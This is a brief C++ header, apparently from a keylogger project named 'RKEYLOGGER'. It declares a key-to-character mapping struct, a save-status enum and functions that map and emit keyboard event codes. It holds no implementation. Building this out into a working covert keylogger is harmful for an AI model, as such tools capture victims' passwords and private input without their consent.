#ifndef __RKEYLOGGER_MAP_CODE__
#define __RKEYLOGGER_MAP_CODE__
    
    struct KeyValue{ 
        const char* normal; 
        const char* shift; 
        const char* altgr; 
    };
    
    enum class MapSaveStatus{
        END, 
        ERROR,
        SUCCESS
    };

    MapSaveStatus map_code(int code, int value);
    bool emit_code(int code);
#endif